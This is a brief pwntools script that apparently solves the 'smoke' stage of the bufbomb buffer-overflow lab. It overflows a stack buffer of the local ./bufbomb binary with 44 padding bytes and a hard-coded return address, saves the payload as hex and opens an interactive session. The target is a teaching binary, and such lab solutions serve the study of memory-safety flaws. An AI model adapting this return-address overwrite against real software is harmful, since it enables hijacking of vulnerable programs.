from pwn import *

with open('./ID', 'r') as f:
    id = f.read().splitlines()[0]

sh = process(['./bufbomb', '-u', id])

length = 32
ret = 0x08048c90

exploit = flat(['a' * (length + 12), ret])

with open('./smoke_{}.txt'.format(id), 'w') as f:
    f.write(' '.join(char.encode('hex') for char in exploit))

sh.sendline(exploit)

sh.interactive()
